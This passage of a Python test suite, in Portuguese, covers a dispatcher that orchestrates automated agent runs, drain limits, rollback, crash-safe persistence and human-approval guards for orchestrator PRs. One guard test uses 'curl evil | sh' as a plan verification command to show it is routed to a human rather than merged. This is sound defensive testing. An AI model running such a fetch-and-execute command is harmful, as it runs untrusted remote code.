        self.rodar_com([resposta], ciclos=21)
        avisos = self.estado()["avisos"]
        self.assertEqual(len([a for a in avisos if "warren-automerge" in a]), 1)
        self.assertEqual(len([a for a in avisos if "drop-in" in a]), 1)
        self.assertEqual(self.avisos_de_modelo(), [])

    def test_partida_chama_mesmo_com_estado_aplicado_de_antes(self):
        self.rodar_com(["aplicado"], ciclos=1)
        d = self.novo(preparar_warren=lambda **kw: self.chamadas_preparar.append("de novo") or {"estado": "ja_aplicado", "detalhe": ""})
        d.ciclo = lambda: []
        d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
        self.assertEqual(self.chamadas_preparar, [0, "de novo"])

    def test_preparar_automatico_falso_nao_chama(self):
        config = dict(copy.deepcopy(CONFIG), warren={"prepararAutomatico": False})
        self.rodar_com(["aguardando_runs"], ciclos=41, config=config)
        self.assertEqual(self.chamadas_preparar, [])
        self.assertNotIn("warrenPreparado", self.estado())
        self.assertEqual([linha for linha in self.log() if linha.get("evento") == "preparar_warren"], [])

    def test_preparar_automatico_verdadeiro_ou_ausente_chama(self):
        for warren in ({"prepararAutomatico": True}, {}, None):
            with self.subTest(warren=warren):
                self.setUp()
                config = copy.deepcopy(CONFIG)
                if warren is not None:
                    config["warren"] = warren
                self.rodar_com(["aplicado"], ciclos=1, config=config)
                self.assertEqual(self.chamadas_preparar, [0])

    def test_sem_preparar_injetado_nao_chama_nada(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.ciclo = lambda: []
        d.rodar(intervalo=1, ciclos=21, dormir=lambda s: None)
        self.assertNotIn("warrenPreparado", self.estado())

    def test_aviso_unico_para_versao_desconhecida_e_erro(self):
        self.rodar_com(["erro", "versao_desconhecida", "erro", "erro"], ciclos=61)
        self.assertEqual(self.chamadas_preparar, [0, 20, 40, 60])
        self.assertEqual(self.avisos_de_modelo(), [self.AVISO])
        avisos_no_log = [linha for linha in self.log() if linha.get("evento") == "aviso" and linha.get("mensagem") == self.AVISO]
        self.assertEqual(len(avisos_no_log), 1)

    def test_versao_desconhecida_sozinha_tambem_avisa(self):
        self.rodar_com(["versao_desconhecida"], ciclos=1)
        self.assertEqual(self.avisos_de_modelo(), [self.AVISO])

    def test_aguardando_e_aplicado_nao_avisam(self):
        self.rodar_com(["aguardando_runs", "aplicado"], ciclos=21)
        self.assertEqual(self.avisos_de_modelo(), [])

    def test_aviso_sai_quando_aplicado_ou_ja_aplicado(self):
        for final in ("aplicado", "ja_aplicado"):
            with self.subTest(final=final):
                self.setUp()
                self.rodar_com(["erro", final], ciclos=21)
                self.assertEqual(self.avisos_de_modelo(), [])
                self.assertEqual(len([linha for linha in self.log() if linha.get("mensagem") == self.AVISO]), 1)

    def test_excecao_no_preparar_vira_erro_e_o_laco_segue(self):
        self.ciclos_feitos = []
        self.rodar_com([RuntimeError("quebrou com " + TOKEN), "erro"], ciclos=21)
        self.assertEqual(self.chamadas_preparar, [0, 20])
        self.assertEqual(len(self.ciclos_feitos), 21)
        linhas = [linha for linha in self.log() if linha.get("evento") == "preparar_warren"]
        self.assertEqual(linhas[0]["estado"], "erro")
        self.assertEqual(linhas[0]["detalhe"], "RuntimeError: quebrou com ***")
        self.assertEqual(self.avisos_de_modelo(), [self.AVISO])
        texto = (self.raiz / "log.jsonl").read_text(encoding="utf-8") + (self.raiz / "estado.json").read_text(encoding="utf-8")
        self.assertNotIn(TOKEN, texto)

    def test_detalhe_devolvido_tem_os_segredos_mascarados(self):
        self.publicar(plano(raia("a")))
        d = self.novo(preparar_warren=lambda **kw: {"estado": "erro", "detalhe": "falhou com " + TOKEN})
        d.iniciar()
        d.ciclo = lambda: []
        d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
        self.assertEqual(self.estado()["warrenPreparado"]["detalhe"], "falhou com ***")
        texto = (self.raiz / "log.jsonl").read_text(encoding="utf-8") + (self.raiz / "estado.json").read_text(encoding="utf-8")
        self.assertNotIn(TOKEN, texto)

    def test_resultado_malformado_vira_erro(self):
        for resposta in (None, {"estado": "inventado", "detalhe": "x"}, {"detalhe": "x"}, "aplicado"):
            with self.subTest(resposta=resposta):
                self.setUp()
                self.publicar(plano(raia("a")))
                d = self.novo(preparar_warren=lambda resposta=resposta, **kw: resposta)
                d.iniciar()
                d.ciclo = lambda: []
                d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
                self.assertEqual(self.estado()["warrenPreparado"]["estado"], "erro")
                self.assertEqual(self.avisos_de_modelo(), [self.AVISO])

    def test_construir_liga_o_preparar_real_ao_motor(self):
        import functools

        import preparar_warren

        (self.repo_dir / ".fabrica").mkdir()
        (self.repo_dir / ".fabrica" / "config.json").write_text(json.dumps(CONFIG), encoding="utf-8")
        (self.tmp / "w").write_text(TOKEN + "\n", encoding="utf-8")
        (self.tmp / "g").write_text(TOKEN_GH + "\n", encoding="utf-8")
        ambiente = {
            "FABRICA_RAIZ": str(self.raiz),
            "FABRICA_REPO_DIR": str(self.repo_dir),
            "FABRICA_PROJETO": PROJETO,
            "FABRICA_REPO": REPO,
            "WARREN_TOKEN_FILE": str(self.tmp / "w"),
            "GH_TOKEN_FILE": str(self.tmp / "g"),
        }
        d = despachante.construir(ambiente)
        self.assertIsInstance(d._preparar_warren, functools.partial)
        self.assertIs(d._preparar_warren.func, preparar_warren.preparar)
        self.assertEqual(d._preparar_warren.keywords, {"visao_geral": d.motor.visao_geral, "versao": d.motor.versao})

    # ---------------------------------------------------------------- D: drenagem limitada

    def test_drenagem_liga_depois_de_2_checagens_seguidas(self):
        self.rodar_com(["aguardando_runs"], ciclos=1)
        self.assertFalse(self.drenagem().get("desde"))
        self.setUp()
        self.rodar_com(["aguardando_runs"], ciclos=2)
        self.assertEqual(self.drenagem()["desde"], self.instante.isoformat())
        self.assertTrue([linha for linha in self.log() if linha.get("evento") == "drenagem_warren" and linha.get("acao") == "inicio"])

    def test_checagens_nao_seguidas_nao_ligam(self):
        self.rodar_com(["aguardando_runs", "erro", "aguardando_runs"], ciclos=21)
        self.assertEqual(self.chamadas_preparar, [0, 1, 20])
        self.assertFalse(self.drenagem().get("desde"))

    def test_aplicar_desliga_a_drenagem(self):
        self.rodar_com(["aguardando_runs", "aguardando_runs", "aguardando_runs", "aplicado"], ciclos=6)
        self.assertEqual(self.chamadas_preparar, [0, 1, 2, 3])
        self.assertFalse(self.drenagem().get("desde"))
        self.assertTrue([linha for linha in self.log() if linha.get("evento") == "drenagem_warren" and linha.get("acao") == "fim"])

    def test_teto_de_45_min_desliga_avisa_e_espera_6_h(self):
        inicio = self.instante
        passo = datetime.timedelta(minutes=10)
        d = self.rodar_com(["aguardando_runs"], ciclos=6, passo=passo, dropin_carregado=True)
        # checagens em t0..t50; ligou em t10; em t50 faz 40 min
        self.assertEqual(self.drenagem()["desde"], (inicio + passo).isoformat())
        d = self.rodar_com(None, ciclos=1, passo=passo, d=d)
        # t60: 50 min de drenagem, acima do teto
        self.assertFalse(self.drenagem().get("desde"))
        self.assertEqual(self.drenagem()["proxima"], (inicio + 6 * passo + datetime.timedelta(hours=6)).isoformat())
        avisos = [a for a in self.estado()["avisos"] if "drenagem" in a]
        self.assertEqual(len(avisos), 1)
        self.assertIn("45 min", avisos[0])
        d = self.rodar_com(None, ciclos=3, passo=passo, d=d)
        self.assertFalse(self.drenagem().get("desde"))
        # depois das 6 h, a drenagem volta
        self.instante = inicio + 6 * passo + datetime.timedelta(hours=6)
        d = self.rodar_com(None, ciclos=1, d=d)
        self.assertEqual(self.drenagem()["desde"], self.instante.isoformat())

    def test_drenagem_persiste_e_e_retomada_pelo_relogio_original(self):
        inicio = self.instante
        self.rodar_com(["aguardando_runs"], ciclos=2, dropin_carregado=True)
        self.assertEqual(self.drenagem()["desde"], inicio.isoformat())
        self.instante = inicio + datetime.timedelta(minutes=30)
        self.ciclos_feitos = []
        d = self.novo(preparar_warren=self.preparar_falso(["aguardando_runs"]))
        self.rodar_com(None, ciclos=1, d=d)
        self.assertEqual(self.drenagem()["desde"], inicio.isoformat())
        self.instante = inicio + datetime.timedelta(minutes=46)
        d = self.novo(preparar_warren=self.preparar_falso(["aguardando_runs"]))
        self.rodar_com(None, ciclos=1, d=d)
        self.assertFalse(self.drenagem().get("desde"))

    def drenando(self, d, ligar=True):
        d.estado["drenagemWarren"] = {"desde": self.instante.isoformat(), "proxima": None} if ligar else {"desde": None}
        d._salvar()

    def test_drenagem_filtra_as_acoes_que_criam_runs_ou_mergeiam(self):
        acoes = [
            {"tipo": "despachar_raia", "raia": "a"},
            {"tipo": "revisar", "seed": "s-1"},
            {"tipo": "corrigir", "seed": "s-2"},
            {"tipo": "verificar", "seed": "s-3"},
            {"tipo": "mergear", "seed": "s-4"},
            {"tipo": "aguardar_humano", "seed": "s-5", "motivo": "x"},
            {"tipo": "retomar_raia", "raia": "b"},
            {"tipo": "acordar", "motivo": "raia_falhou", "alvo": "c"},
        ]
        for ligar, esperado in (
            (True, ["verificar", "aguardar_humano", "retomar_raia"]),
            (False, [a["tipo"] for a in acoes]),
        ):
            with self.subTest(drenando=ligar):
                self.setUp()
                self.publicar(plano(raia("a")))
                d = self.novo(preparar_warren=self.preparar_falso(["aguardando_runs"]))
                d.iniciar()
                self.drenando(d, ligar)
                d._observadas = {"s-1", "s-2", "s-3", "s-4", "s-5"}
                feitas = []
                d._executar = lambda acao: feitas.append(acao["tipo"])
                d._proposta_de_pendente = lambda: {"tipo": "acordar", "motivo": "nova_spec", "alvo": "x"} if False else None
                with mock.patch.object(despachante.est, "proximas_acoes", return_value=copy.deepcopy(acoes)):
                    d._agir()
                self.assertEqual(feitas, esperado)

    def test_drenagem_segura_a_acordada_pendente(self):
        self.publicar(plano(raia("a")))
        d = self.novo(preparar_warren=self.preparar_falso(["aguardando_runs"]))
        d.iniciar()
        self.drenando(d)
        feitas = []
        d._executar = lambda acao: feitas.append(acao["tipo"])
        d._proposta_de_pendente = lambda: {"tipo": "acordar", "motivo": "nova_spec", "alvo": "x"}
        with mock.patch.object(despachante.est, "proximas_acoes", return_value=[]):
            d._agir()
        self.assertEqual(feitas, [])

    def test_ciclo_real_durante_a_drenagem_nao_despacha_e_depois_despacha(self):
        self.publicar(plano(raia("a")))
        d = self.novo(preparar_warren=self.preparar_falso(["aguardando_runs"]))
        d.iniciar()
        self.drenando(d)
        d.ciclo()
        self.assertEqual(self.planos_despachados(), [])
        self.drenando(d, ligar=False)
        d.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)

    def test_iniciar_spec_durante_a_drenagem_so_enfileira(self):
        self.publicar(plano(raia("a")))
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo(preparar_warren=self.preparar_falso(["aguardando_runs"]))
        d.iniciar()
        self.drenando(d)
        mensagem = d.iniciar(spec="docs/spec.md")
        self.assertIn("registrada", mensagem)
        self.assertEqual(self.runs(), [])

    def test_drenagem_sem_preparar_ligado_nao_vale(self):
        config = dict(copy.deepcopy(CONFIG), warren={"prepararAutomatico": False})
        self.publicar(plano(raia("a")))
        d = self.novo(config=config, preparar_warren=self.preparar_falso(["aguardando_runs"]))
        d.iniciar()
        self.drenando(d)
        d.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)

    # ---------------------------------------------------------------- E: rollback

    def revertido(self, voltou, sha="b" * 64):
        return {"estado": "revertido", "detalhe": "revertido", "dropin": "ok", "automerge": "ausente", "sha": sha, "warrenVoltou": voltou}

    def test_revertido_suspende_ate_o_sha_mudar(self):
        self.rodar_com([self.revertido(True), {"estado": "revertido", "detalhe": "suspenso", "sha": "b" * 64}], ciclos=41)
        self.assertEqual(self.chamadas_preparar, [0, 20, 40])
        self.assertEqual([k.get("sha_revertido") for k in self.kwargs_preparar], [None, "b" * 64, "b" * 64])
        self.assertEqual(self.estado()["warrenPreparado"]["estado"], "revertido")
        self.assertEqual(self.avisos_de_modelo(), [self.AVISO])

    def test_revertido_nao_passa_adiante_depois_que_o_sha_muda(self):
        self.rodar_com([self.revertido(True), "erro", "erro"], ciclos=41)
        self.assertEqual([k.get("sha_revertido") for k in self.kwargs_preparar], [None, "b" * 64, None])

    def test_reinicio_do_despachante_libera_nova_tentativa(self):
        self.rodar_com([self.revertido(True)], ciclos=1)
        d = self.novo(preparar_warren=self.preparar_falso(["aguardando_runs"]))
        self.rodar_com(None, ciclos=1, d=d)
        self.assertEqual(self.kwargs_preparar, [{"sha_revertido": None}])

    def test_warren_que_volta_depois_do_rollback_nao_abre_decisao(self):
        self.rodar_com([self.revertido(True)], ciclos=1)
        self.assertNotIn(despachante.AVISO_WARREN_FORA_APOS_ROLLBACK, self.estado()["avisos"])
        self.assertEqual(self.forja.decisoes, [])

    def test_warren_fora_apos_rollback_aviso_repetido_e_decisao_unica(self):
        self.rodar_com([self.revertido(False), self.revertido(False, sha="c" * 64)], ciclos=21)
        avisos = [a for a in self.estado()["avisos"] if a == despachante.AVISO_WARREN_FORA_APOS_ROLLBACK]
        self.assertEqual(len(avisos), 2)
        self.assertEqual(despachante.AVISO_WARREN_FORA_APOS_ROLLBACK, "Warren fora do ar após rollback")
        self.assertEqual(len(self.forja.decisoes), 1)
        titulo, corpo = self.forja.decisoes[0]
        self.assertIn("rollback", titulo)
        (decisao,) = [x for x in self.estado()["decisoes"] if x.get("tipo") == "warren_rollback"]
        self.assertEqual(decisao["motivo"], despachante.AVISO_WARREN_FORA_APOS_ROLLBACK)

    def test_decisao_de_rollback_fecha_sozinha_quando_o_warren_volta(self):
        class MotorForaDoAr(motor.MotorFalso):
            fora = True

            def versao(self):
                if self.fora:
                    raise motor.FalhaAntesDoEnvio("GET /version: falha de rede (ConnectionRefusedError)")
                return "0.19.3"

        self.motor = MotorForaDoAr()
        self.ciclos_feitos = []
        self.publicar(plano(raia("a")))
        d = self.novo(preparar_warren=self.preparar_falso([self.revertido(False)]))
        d.iniciar()
        d.ciclo = lambda: []
        d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
        (url,) = [x["url"] for x in self.estado()["decisoes"] if x.get("tipo") == "warren_rollback"]
        d = self.novo()
        d.ciclo()
        self.assertIn(url, [x["url"] for x in self.estado()["decisoes"]])
        self.motor.fora = False
        d.ciclo()
        d.ciclo()
        self.assertNotIn(url, [x.get("url") for x in self.estado().get("decisoes", [])])
        self.assertIn(url, [a["url"] for nome, a in self.forja.chamadas if nome == "fechar_decisao"])


# ---------------------------------------------------------------- ordem do ciclo


class TestesOrdemDoCiclo(Base):
    def _eventos(self):
        eventos = []
        for nome, alvo in (("motor", self.motor), ("forja", self.forja)):
            original = alvo._registrar

            def registrar(n, _o=original, _q=nome, **argumentos):
                eventos.append((_q, n, argumentos))
                _o(n, **argumentos)

            alvo._registrar = registrar
        return eventos

    def test_plano_runs_e_orquestrador_antes_dos_planos_e_dos_prs(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d.iniciar(spec="docs/spec.md")
        rev = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        orq = self.estado()["orquestrador"]["runId"]
        self.motor.definir_run(orq, estado="succeeded")  # sem PR
        eventos = self._eventos()
        d.ciclo()

        def indice(quem, nome, **argumentos):
            for i, (q, n, a) in enumerate(eventos):
                if q == quem and n == nome and all(a.get(k) == v for k, v in argumentos.items()):
                    return i
            self.fail(f"chamada ausente: {quem}.{nome} {argumentos}")

        plano_main = indice("forja", "arquivo", ref="main", caminho=".fabrica/plano.json")
        run_rev = indice("motor", "run", run_id=rev)
        run_orq = indice("motor", "run", run_id=orq)
        plano_raia = indice("motor", "plano", plan_run_id="plano-1")
        pr = indice("forja", "pr", url=PR)
        ci = indice("forja", "ci", sha=H1)
        self.assertEqual(plano_main, 0)
        self.assertLess(plano_main, run_rev)
        self.assertLess(run_rev, plano_raia)
        self.assertLess(run_orq, plano_raia)
        self.assertLess(plano_raia, pr)
        self.assertLess(pr, ci)
        lidos = [a["run_id"] for q, n, a in eventos if q == "motor" and n == "run"]
        self.assertEqual(lidos.count(rev), 1)
        self.assertEqual(lidos.count(orq), 1)

    def test_sincroniza_o_plano_a_cada_ciclo(self):
        d = self.preparar_raia()
        with mock.patch.object(despachante.est, "sincronizar_plano", wraps=est.sincronizar_plano) as espiao:
            d.ciclo()
            d.ciclo()
            d.ciclo()
        self.assertEqual(espiao.call_count, 3)

    def test_raia_falhou_volta_quando_o_orquestrador_termina_depois_do_plano_novo(self):
        # o plano novo chega com o orquestrador ainda rodando; a raia só volta quando ele termina,
        # num ciclo em que o plano já não muda: isso exige sincronizar a cada ciclo, depois de concluir
        d = self.preparar_raia()
        self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")
        orq = self.estado()["orquestrador"]["runId"]
        self.assertTrue(orq)
        self.publicar(plano(raia("a", plano_seeds="pl-00aa")))
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")
        self.assertEqual(len(self.planos_despachados()), 1)
        self.motor.definir_run(orq, estado="succeeded")
        d.ciclo()
        self.assertEqual(len(self.planos_despachados()), 2)
        self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00aa")
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")


# ---------------------------------------------------------------- persistência


class TestesPersistencia(Base):
    def test_gravacao_atomica_usa_tmp_no_mesmo_diretorio_fsync_e_replace(self):
        destino = self.raiz / "estado.json"
        destino.write_text('{"antigo": true}', encoding="utf-8")
        ordem = []
        replace_original, fsync_original = os.replace, os.fsync

        def replace(origem, alvo):
            ordem.append(("replace", origem, alvo))
            return replace_original(origem, alvo)

        def fsync(fd):
            ordem.append(("fsync", os.fstat(fd).st_mode))
            return fsync_original(fd)

        with mock.patch.object(despachante.os, "replace", side_effect=replace), mock.patch.object(
            despachante.os, "fsync", side_effect=fsync
        ):
            despachante.gravar_json_atomico(destino, {"novo": 1})
        ((_, origem, alvo),) = [o for o in ordem if o[0] == "replace"]
        self.assertEqual(pathlib.Path(alvo), destino)
        self.assertEqual(pathlib.Path(origem).parent, self.raiz)
        self.assertNotEqual(pathlib.Path(origem), destino)
        indice_replace = ordem.index(("replace", origem, alvo))
        # o conteúdo do temporário (um arquivo regular) vai ao disco antes da troca
        self.assertTrue(any(o[0] == "fsync" and stat.S_ISREG(o[1]) for o in ordem[:indice_replace]))
        self.assertEqual(json.loads(destino.read_text(encoding="utf-8")), {"novo": 1})
        self.assertEqual(sorted(p.name for p in self.raiz.iterdir()), ["estado.json"])

    def test_falha_antes_do_replace_preserva_o_arquivo_e_nao_deixa_tmp(self):
        destino = self.raiz / "estado.json"
        destino.write_text('{"antigo": true}', encoding="utf-8")
        with mock.patch.object(despachante.os, "replace", side_effect=OSError("disco cheio")):
            with self.assertRaises(OSError):
                despachante.gravar_json_atomico(destino, {"novo": 1})
        self.assertEqual(destino.read_text(encoding="utf-8"), '{"antigo": true}')
        self.assertEqual(sorted(p.name for p in self.raiz.iterdir()), ["estado.json"])

    def test_estado_e_gravado_depois_de_cada_acao(self):
        self.publicar(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d = self.novo()
        d.iniciar()
        gravados = []
        original = despachante.gravar_json_atomico

        def espiao(caminho, dados):
            if pathlib.Path(caminho).name == "estado.json":
                gravados.append(copy.deepcopy(dados))
            return original(caminho, dados)

        with mock.patch.object(despachante, "gravar_json_atomico", side_effect=espiao):
            d.ciclo()
        self.assertTrue(
            any(
                g["raias"]["a"]["estado"] == "executando"
                and g["raias"]["b"]["estado"] == "planejada"
                and not g.get("acaoEmCurso")
                for g in gravados
            ),
            "o estado não foi gravado entre a primeira e a segunda ação",
        )
        self.assertEqual(self.estado()["raias"]["b"]["estado"], "executando")

    def test_queda_no_meio_da_segunda_acao_nao_redespacha_nenhuma(self):
        class MotorQueCai(motor.MotorFalso):
            cair = True

            def despachar_plano(self, **argumentos):
                plan_run_id = super().despachar_plano(**argumentos)
                if self.cair and len([c for c in self.chamadas if c[0] == "despachar_plano"]) == 2:
                    raise KeyboardInterrupt  # o Warren aceitou, o processo morreu antes de gravar
                return plan_run_id

        self.motor = MotorQueCai()
        self.publicar(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d = self.novo()
        d.iniciar()
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()
        disco = self.estado()
        self.assertEqual(disco["raias"]["a"]["planRunId"], "plano-1")
        self.assertEqual(
            {k: v for k, v in disco["acaoEmCurso"].items() if k not in ("nonce", "nonceRaiz", "desde")}, {"tipo": "despachar_raia", "raia": "b"}
        )
        self.assertRegex(disco["acaoEmCurso"]["nonce"], r"^[0-9a-f]{32}$")
        self.assertEqual(disco["acaoEmCurso"]["nonceRaiz"], disco["acaoEmCurso"]["nonce"])
        self.assertRegex(disco["acaoEmCurso"]["desde"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        self.motor.cair = False
        outro = self.novo()
        outro.ciclo()
        disco = self.estado()
        self.assertEqual(len(self.planos_despachados()), 2)  # nada é despachado de novo
        self.assertEqual(disco["raias"]["a"]["estado"], "executando")
        self.assertEqual((disco["raias"]["b"]["estado"], disco["raias"]["b"]["planRunId"]), ("executando", "plano-2"))
        self.assertNotIn("acaoEmCurso", disco)
        self.assertEqual(disco["despachosIncertos"], [])

    def test_queda_no_meio_de_acordar_acha_o_run_pelo_nonce(self):
        class MotorQueCai(motor.MotorFalso):
            cair = True

            def despachar_run(self, **argumentos):
                run_id = super().despachar_run(**argumentos)
                if self.cair:
                    raise KeyboardInterrupt
                return run_id

        self.motor = MotorQueCai()
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        with self.assertRaises(KeyboardInterrupt):
            d.iniciar(spec="docs/spec.md")
        self.motor.cair = False
        outro = self.novo()
        outro.ciclo()
        disco = self.estado()
        self.assertFalse(disco["pausado"])  # P1: achado pelo nonce, sem pausa e sem segundo orquestrador
        self.assertEqual(len(self.runs()), 1)
        self.assertEqual(disco["orquestrador"]["runId"], "run-1")
        self.assertEqual(disco["orquestrador"]["acordada"]["motivo"], "nova_spec")
        self.assertNotIn("acaoEmCurso", disco)

    def test_falha_de_despacho_marca_falhou_e_nao_tenta_de_novo(self):
        class MotorQueFalha(motor.MotorFalso):
            def despachar_plano(self, **argumentos):
                super().despachar_plano(**argumentos)
                raise RuntimeError("POST /plan-runs: HTTP 502")

        self.motor = MotorQueFalha()
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")

    def test_estado_de_outro_repo_e_recusado(self):
        self.preparar_raia()
        with self.assertRaises(despachante.ConfigInvalida):
            self.novo(repo="outro/repo")

    def test_estado_ilegivel_nao_e_recriado(self):
        (self.raiz / "estado.json").write_text("{quebrado", encoding="utf-8")
        with self.assertRaises(despachante.ErroDeEntrada):  # F10: saída 2, não um laço de reinícios
            self.novo()
        self.assertEqual((self.raiz / "estado.json").read_text(encoding="utf-8"), "{quebrado")


# ---------------------------------------------------------------- trava de instância única


class TestesTrava(Base):
    def test_trava_e_exclusiva_e_liberada_ao_sair(self):
        with despachante.travar(self.raiz):
            with self.assertRaises(despachante.OutroDespachante) as ctx:
                with despachante.travar(self.raiz):
                    pass
            self.assertEqual(str(ctx.exception), "outro despachante está rodando nesta raiz")
        with despachante.travar(self.raiz):
            pass
        self.assertTrue((self.raiz / "despachante.lock").exists())

    def test_cli_sai_com_3_quando_a_trava_esta_tomada(self):
        construidos = []
        for argv in (["iniciar"], ["rodar"]):
            with self.subTest(argv=argv):
                saida, erro = io.StringIO(), io.StringIO()
                with despachante.travar(self.raiz):
                    codigo = despachante.main(
                        argv,
                        ambiente={"FABRICA_RAIZ": str(self.raiz)},
                        construir=lambda amb: construidos.append(amb),
                        saida=saida,
                        erro=erro,
                    )
                self.assertEqual(codigo, 3)
                self.assertIn("outro despachante está rodando nesta raiz", erro.getvalue())
        self.assertEqual(construidos, [])

    def test_processo_separado_tambem_e_barrado(self):
        with despachante.travar(self.raiz):
            r = subprocess.run(
                [sys.executable, "-I", "-B", str(SCRIPT), "rodar"],
                env={"FABRICA_RAIZ": str(self.raiz), "PATH": os.environ.get("PATH", "")},
                capture_output=True,
                text=True,
                timeout=30,
            )
        self.assertEqual(r.returncode, 3, r.stderr)
        self.assertIn("outro despachante está rodando nesta raiz", r.stderr)
        self.assertNotIn("Traceback", r.stderr)


# ---------------------------------------------------------------- PR do orquestrador


class TestesPrDoOrquestrador(Base):
    def test_replanejamento_valido_mergeia_com_o_sha_do_head(self):
        d, rid = self.acordar_por_falha()
        novo_plano = plano(raia("a", plano_seeds="pl-00aa"), raia("b", plano_seeds="pl-000b"))
        self.pr_do_orquestrador(
            rid,
            [".fabrica/plano.json", ".seeds/issues.jsonl", ".fabrica/planejamento/f1/plano.md"],
            novo_plano,
        )
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertEqual(self.forja.decisoes, [])
        self.assertIsNone(self.estado()["orquestrador"]["runId"])
        self.assertEqual(self.estado()["orquestrador"]["ultimoMotivo"], "raia_falhou")

    def test_pr_do_orquestrador_nova_spec_abre_decisao(self):
        self.publicar(plano(raia("a")))
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        (orq,) = self.runs(FABLE)
        self.assertIn("Motivo: nova_spec", orq["prompt"])
        self.assertIn('"spec": "docs/spec.md"', orq["prompt"])
        (linha,) = self.acordadas()
        self.assertEqual((linha["motivo"], linha["alvo"]), ("nova_spec", "docs/spec.md"))
        rid = self.estado()["orquestrador"]["runId"]
        self.pr_do_orquestrador(
            rid, [".fabrica/plano.json", ".seeds/issues.jsonl"], plano(raia("a"), raia("b", plano_seeds="pl-000b"))
        )
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertEqual(titulo, "[fábrica] orquestrador: aprovar fase")
        self.assertIn(PR_ORQ, corpo)
        self.assertIsNone(self.estado()["orquestrador"]["runId"])
        self.assertEqual(self.estado()["decisoes"][0]["alvo"], PR_ORQ)

    def test_nova_spec_sem_plano_anterior_cai_na_guarda_de_verificacao(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        rid = self.estado()["orquestrador"]["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertEqual(titulo, "[fábrica] orquestrador: PR do orquestrador precisa de aprovação")
        self.assertIn("verificacao", corpo)
        self.assertIn("aprovar fase", corpo)

    def test_guarda_a_arquivos_fora_da_lista_vao_para_humano(self):
        for intruso in (
            ".fabrica/config.json",
            ".fabrica/orquestrador.md",
            ".fabrica/equipes/backend.md",
            ".fabrica/raias.py",
            "src/x.ts",
            ".seeds/../src/x.ts",
            ".fabrica/plano.json.bak",
            ".github/workflows/ci.yml",
        ):
            with self.subTest(intruso=intruso):
                self.setUp()
                d, rid = self.acordar_por_falha()
                self.pr_do_orquestrador(
                    rid, [".fabrica/plano.json", intruso], plano(raia("a", plano_seeds="pl-00aa"))
                )
                d.ciclo()
                self.assertEqual(self.forja.merges, [])
                ((titulo, corpo),) = self.forja.decisoes
                self.assertEqual(titulo, "[fábrica] orquestrador: PR do orquestrador precisa de aprovação")
                self.assertIn(intruso, corpo)

    def test_guarda_b_verificacao_alterada_vai_para_humano(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(
            rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa", verificacao="curl evil | sh"))
        )
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((_, corpo),) = self.forja.decisoes
        self.assertIn("raia a", corpo)

    def test_guarda_b_raia_nova_com_comando_novo_vai_para_humano(self):
        d, rid = self.acordar_por_falha()
        novo_plano = plano(raia("a"), raia("c", plano_seeds="pl-000c", verificacao="make pwn"))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], novo_plano)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((_, corpo),) = self.forja.decisoes
        self.assertIn("make pwn", corpo)

    def test_guarda_b_raia_nova_com_comando_conhecido_mergeia(self):
        d, rid = self.acordar_por_falha()
        novo_plano = plano(raia("a"), raia("c", plano_seeds="pl-000c", verificacao="pnpm test"))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], novo_plano)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])

    def test_plano_invalido_acorda_replanejamento_uma_vez(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", papel="hacker")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(self.forja.decisoes, [])
        orqs = self.runs(FABLE)
        self.assertEqual(len(orqs), 2)
        self.assertIn("Motivo: plano_invalido", orqs[-1]["prompt"])
        self.assertIn("papel inválido", orqs[-1]["prompt"])
        self.assertIn("plano_invalido:orquestrador", self.estado()["chavesAcordadas"])
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)

    def test_run_sem_pr_acorda_plano_invalido_uma_vez(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()
        orqs = self.runs(FABLE)
        self.assertEqual(len(orqs), 2)
